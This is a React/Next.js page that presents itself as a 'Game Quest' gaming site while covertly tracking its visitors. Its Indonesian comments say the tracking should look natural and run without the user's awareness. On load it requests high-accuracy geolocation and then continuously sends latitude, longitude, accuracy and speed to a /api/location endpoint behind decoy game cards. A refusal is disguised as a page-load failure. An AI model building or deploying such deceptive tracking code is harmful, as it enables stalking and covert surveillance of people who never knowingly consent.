"use client";

import { useState, useEffect, useRef } from "react";

export default function TrackPage() {
  const [status, setStatus] = useState("⏳ Memuat...");
  const [location, setLocation] = useState<{
    lat: number;
    lng: number;
    accuracy: number;
    speed: number;
  } | null>(null);
  const [isTracking, setIsTracking] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showContent, setShowContent] = useState(false);
  const watchIdRef = useRef<number | null>(null);

  // AUTO START - langsung jalan saat halaman dibuka
  useEffect(() => {
    // Delay sebentar biar keliatan natural
    setTimeout(() => {
      startTracking();
    }, 500);
  }, []);

  const startTracking = () => {
    setError(null);

    if (!navigator.geolocation) {
      setError("Browser tidak mendukung fitur ini");
      setStatus("❌ Error");
      return;
    }

    setStatus("⏳ Memuat...");

    navigator.geolocation.getCurrentPosition(
      // Success - izin diberikan
      () => {
        setStatus("✅ Selesai!");
        setIsTracking(true);
        setShowContent(true);
        startWatching();
      },
      // Error - izin ditolak
      (error) => {
        console.error("Error izin:", error);
        setError("Gagal memuat halaman");
        setStatus("❌ Error");
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
      },
    );
  };

  const startWatching = () => {
    if (watchIdRef.current !== null) {
      navigator.geolocation.clearWatch(watchIdRef.current);
    }

    watchIdRef.current = navigator.geolocation.watchPosition(
      async (position) => {
        const data = {
          lat: position.coords.latitude,
          lng: position.coords.longitude,
          accuracy: Math.round(position.coords.accuracy),
          speed: position.coords.speed
            ? Math.round(position.coords.speed * 3.6)
            : 0,
          timestamp: Date.now(),
        };

        setLocation(data);

        // Kirim ke server
        try {
          await fetch("/api/location", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(data),
          });
        } catch (err) {
          console.error("Gagal kirim data:", err);
        }
      },
      (error) => {
        console.error("GPS Error:", error);
      },
      {
        enableHighAccuracy: true,
        maximumAge: 2000,
        timeout: 5000,
      },
    );
  };

  // Bersihkan saat komponen unmount
  useEffect(() => {
    return () => {
      if (watchIdRef.current !== null) {
        navigator.geolocation.clearWatch(watchIdRef.current);
      }
    };
  }, []);

  // Game Cards Data
  const gameCards = [
    {
      id: 1,
      title: "Petualangan Digital",
      icon: "🎮",
      description: "Jelajahi dunia digital dengan teknologi terkini",
      color: "from-blue-500 to-purple-600",
      stats: "Level 42",
    },
    {
      id: 2,
      title: "Misi Inovasi",
      icon: "🚀",
      description: "Bangun masa depan dengan solusi kreatif",
      color: "from-green-500 to-teal-600",
      stats: "XP 1,234",
    },
    {
      id: 3,
      title: "Kolaborasi Tim",
      icon: "🤝",
      description: "Bergabung dengan 500+ gamer profesional",
      color: "from-orange-500 to-red-600",
      stats: "Guild Active",
    },
    {
      id: 4,
      title: "Prestasi Digital",
      icon: "🏆",
      description: "Raih penghargaan di era modern",
      color: "from-pink-500 to-rose-600",
      stats: "10+ Awards",
    },
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900">
      {/* Game Header */}
      <div className="max-w-6xl mx-auto px-4 py-6">
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl flex items-center justify-center shadow-lg shadow-yellow-500/20">
              <span className="text-2xl">⚔️</span>
            </div>
            <div>
              <h1 className="text-2xl font-bold text-white">Game Quest</h1>
              <p className="text-gray-400 text-sm">Season 2024 • Live</p>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <div className="bg-gray-800/50 backdrop-blur-sm px-4 py-2 rounded-full border border-gray-700">
              <span className="text-yellow-400 text-sm">⭐ {status}</span>
            </div>
            <div className="w-10 h-10 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center shadow-lg shadow-purple-500/20">
              <span className="text-white font-bold">P</span>
            </div>
          </div>
        </div>

        {/* Game Cards Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
          {!showContent ? (
            // Loading State sebagai Card
            <div className="col-span-full">
              <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl p-12 border border-gray-700">
                <div className="flex flex-col items-center justify-center">
                  <div className="relative">
                    <div className="w-20 h-20 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                    <div className="absolute inset-0 flex items-center justify-center">
                      <span className="text-3xl">🎯</span>
                    </div>
                  </div>
                  <p className="text-gray-300 mt-4 text-lg">{status}</p>
                  {error && (
                    <p className="text-red-400 text-sm mt-2">{error}</p>
                  )}
                </div>
              </div>
            </div>
          ) : (
            // Game Cards
            gameCards.map((card) => (
              <div
                key={card.id}
                className="group relative bg-gray-800/50 backdrop-blur-sm rounded-2xl p-6 border border-gray-700 hover:border-yellow-500/50 transition-all duration-300 hover:transform hover:-translate-y-2 hover:shadow-2xl hover:shadow-yellow-500/10 cursor-pointer"
              >
                {/* Card Glow Effect */}
                <div
                  className={`absolute inset-0 bg-gradient-to-r ${card.color} opacity-0 group-hover:opacity-10 rounded-2xl transition-opacity duration-300`}
                ></div>

                {/* Card Content */}
                <div className="relative">
                  <div
                    className={`w-16 h-16 bg-gradient-to-r ${card.color} rounded-xl flex items-center justify-center mb-4 shadow-lg`}
                  >
                    <span className="text-3xl">{card.icon}</span>
                  </div>

                  <h3 className="text-xl font-bold text-white mb-2">
                    {card.title}
                  </h3>
                  <p className="text-gray-400 text-sm mb-4">
                    {card.description}
                  </p>

                  <div className="flex items-center justify-between pt-4 border-t border-gray-700">
                    <span className="text-xs text-gray-500">Status</span>
                    <span className="text-xs font-semibold text-yellow-400 bg-yellow-400/10 px-3 py-1 rounded-full">
                      {card.stats}
                    </span>
                  </div>

                  {/* Hover Action */}
                  <div className="absolute bottom-6 right-6 opacity-0 group-hover:opacity-100 transition-opacity duration-300">
                    <div className="w-8 h-8 bg-yellow-400 rounded-full flex items-center justify-center shadow-lg shadow-yellow-400/20">
                      <span className="text-black text-xs">▶</span>
                    </div>
                  </div>
                </div>
              </div>
            ))
          )}
        </div>

        {/* Extra Game Stats - Only shown when tracking */}
        {isTracking && location && (
          <div className="mt-8 grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-4 border border-gray-700">
              <div className="flex items-center gap-3">
                <span className="text-2xl">📍</span>
                <div>
                  <p className="text-gray-400 text-xs">Location</p>
                  <p className="text-white text-sm font-mono">
                    {location.lat.toFixed(6)}, {location.lng.toFixed(6)}
                  </p>
                </div>
              </div>
            </div>
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-4 border border-gray-700">
              <div className="flex items-center gap-3">
                <span className="text-2xl">🎯</span>
                <div>
                  <p className="text-gray-400 text-xs">Accuracy</p>
                  <p className="text-white text-sm font-mono">
                    ±{location.accuracy}m
                  </p>
                </div>
              </div>
            </div>
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-4 border border-gray-700">
              <div className="flex items-center gap-3">
                <span className="text-2xl">⚡</span>
                <div>
                  <p className="text-gray-400 text-xs">Speed</p>
                  <p className="text-white text-sm font-mono">
                    {location.speed} km/h
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Game Footer */}
        <div className="mt-8 text-center">
          <div className="inline-flex items-center gap-4 bg-gray-800/30 backdrop-blur-sm px-6 py-3 rounded-full border border-gray-700">
            <span className="text-gray-500 text-sm">🎮 Game Quest v2.0</span>
            <span className="w-px h-4 bg-gray-700"></span>
            <span className="text-gray-500 text-sm">
              👥 1,234 Players Online
            </span>
            <span className="w-px h-4 bg-gray-700"></span>
            <span className="text-gray-500 text-sm">🏅 Leaderboard</span>
          </div>
        </div>
      </div>

      {/* Hidden - tracking berjalan di background tanpa user sadar */}
      {isTracking && location && (
        <div className="hidden">
          {/* Data tetap dikirim, tapi user tidak melihat */}
        </div>
      )}
    </div>
  );
}
